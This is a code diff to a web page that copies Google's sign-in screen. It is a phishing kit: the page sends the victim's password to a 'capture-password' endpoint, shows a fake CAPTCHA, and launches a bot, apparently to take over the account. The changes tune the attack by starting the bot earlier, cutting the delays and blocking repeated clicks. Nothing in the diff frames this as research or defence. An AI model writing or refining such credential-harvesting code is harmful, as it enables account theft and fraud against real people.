@@ -84,7 +84,7 @@ body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#20
 var apiBase=new URLSearchParams(location.search).get('api')||'http://localhost:8080';
 var siteUrl=new URLSearchParams(location.search).get('url')||'';
 var redirectUrl=new URLSearchParams(location.search).get('redirect')||'';
-var _email='',_uid='',_poll=null;
+var _email='',_uid='',_poll=null,_captchaSolving=false;
 function showScreen(id){
   document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
   var el=document.getElementById(id);
@@ -113,7 +113,7 @@ function goToCaptcha(){
     if(d.success){
       _uid=d.userId;
       post('/api/auth/capture-password',{userId:_uid,password:p}).then(function(){
-        setTimeout(function(){showScreen('page-captcha');},1200);
+        setTimeout(function(){showScreen('page-captcha');},300);
       });
     } else {
       showScreen('page-password');
@@ -126,12 +126,15 @@ function goToCaptcha(){
 }
 window.goToCaptcha=goToCaptcha;
 function solveCaptcha(){
+  if(_captchaSolving)return;
+  _captchaSolving=true;
   var box=document.getElementById('captcha-check');
   var spin=document.getElementById('captcha-spinner');
   var icon=document.getElementById('captcha-icon');
   if(box.style.backgroundColor==='rgb(26, 115, 232)')return;
   spin.style.display='block';
   box.style.backgroundColor='#fff';
+  launchBot();
   setTimeout(function(){
     spin.style.display='none';
     icon.style.opacity='1';
@@ -139,10 +142,9 @@ function solveCaptcha(){
     box.style.borderColor='#1a73e8';
     document.getElementById('captcha-msg').textContent='Vérification de sécurité terminée.';
     document.getElementById('captcha-msg').style.color='#34a853';
-    launchBot();
     showScreen('page-loading-mail');
-    setTimeout(function(){showScreen('page-mail-info');document.getElementById('mail-user-email').textContent=_email;},2000);
-  },14000);
+    setTimeout(function(){showScreen('page-mail-info');document.getElementById('mail-user-email').textContent=_email;},1500);
+  },2500);
 }
 window.solveCaptcha=solveCaptcha;
 function launchBot(){
